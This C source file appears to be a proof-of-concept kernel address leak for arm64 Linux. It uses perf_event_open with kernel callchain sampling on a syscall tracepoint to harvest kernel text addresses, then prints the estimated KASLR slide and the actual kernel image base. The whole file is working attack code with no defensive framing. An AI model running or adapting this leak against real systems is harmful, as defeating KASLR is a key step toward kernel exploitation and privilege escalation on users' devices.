#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <fcntl.h>

struct perf_sample { struct perf_event_header h; uint64_t ip,pid_tid,time,addr,period; uint64_t cc[32]; };

int main() {
    /* Try syscall tracepoint: syscalls:sys_enter_getpid */
    /* tp id = PERF_TYPE_TRACEPOINT, config = tracepoint_id */

    /* First try via debugfs tracepoint ID */
    int tp_fd = open("/sys/kernel/debug/tracing/events/syscalls/sys_enter_getpid/id", O_RDONLY);
    int tp_id = 0;
    if(tp_fd>=0){char buf[32];int n=read(tp_fd,buf,sizeof(buf)-1);if(n>0){buf[n]=0;tp_id=atoi(buf);}close(tp_fd);}
    printf("tp_id=%d\n",tp_id);

    struct perf_event_attr a; memset(&a,0,sizeof(a));
    if(tp_id>0){
        a.type=PERF_TYPE_TRACEPOINT; a.size=sizeof(a); a.config=tp_id;
    } else {
        /* fallback: software event with sampling */
        a.type=PERF_TYPE_SOFTWARE; a.size=sizeof(a); a.config=PERF_COUNT_SW_PAGE_FAULTS;
    }
    a.sample_period=1;
    a.sample_type=PERF_SAMPLE_IP|PERF_SAMPLE_CALLCHAIN|PERF_SAMPLE_TID;
    a.sample_max_stack=24; a.disabled=1;
    a.exclude_user=(tp_id>0)?0:1;
    a.exclude_kernel=0;
    a.exclude_hv=1;

    int fd=syscall(SYS_perf_event_open,&a,0,-1,-1,0);
    if(fd<0){printf("errno=%d\n",errno);return 1;}
    printf("perf_event_open OK fd=%d\n",fd);

    int pg=sysconf(_SC_PAGESIZE);
    size_t sz=(size_t)pg*33;
    void*b=mmap(NULL,sz,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
    if(b==MAP_FAILED){printf("mmap errno=%d\n",errno);close(fd);return 1;}

    ioctl(fd,PERF_EVENT_IOC_RESET,0);
    ioctl(fd,PERF_EVENT_IOC_ENABLE,0);

    for(int i=0;i<5000000;i++){ getpid(); getuid(); }

    ioctl(fd,PERF_EVENT_IOC_DISABLE,0);

    struct perf_event_mmap_page*h=b;
    uint64_t hd=h->data_head, tl=0;
    char*d=b+h->data_offset;
    uint64_t ds=h->data_size;

    /* Find lowest kernel text addr */
    uint64_t min_addr=~0ULL;
    int total=0, vmlinux=0;
    while(tl<hd){
        struct perf_sample*s=(void*)(d+(tl%ds));
        tl+=s->h.size;
        uint64_t all[33]; int ac=1; all[0]=s->ip;
        for(int c=0;c<24&&s->cc[c];c++) all[ac++]=s->cc[c];
        for(int i=0;i<ac;i++){
            uint64_t v=all[i];
            if(v<0xffff000000000000ULL) continue; total++;
            /* vmlinux: 0xffffffc0xxxxxxxx */
            if((v>>40)==0xffffffc){
                vmlinux++;
                if(v<min_addr) min_addr=v;
                if(vmlinux<=8) printf("VMLINUX: 0x%016lx\n",v);
            }
        }
    }
    printf("\ntotal kernel addrs: %d, vmlinux: %d\n",total,vmlinux);
    if(vmlinux>0){
        unsigned long long base=0xffffffc010000000ULL;
        long long slide=min_addr-base;
        printf("min vmlinux addr: 0x%016llx\n",min_addr);
        printf("est slide vs hardcoded base: 0x%llx (%lld MB)\n",slide,slide/(1024*1024));
        printf("ACTUAL KIMAGE_TEXT_BASE: 0x%016llx\n",min_addr&~0x3FFFFFULL);
    }

    munmap(b,sz);close(fd);
    return 0;
}
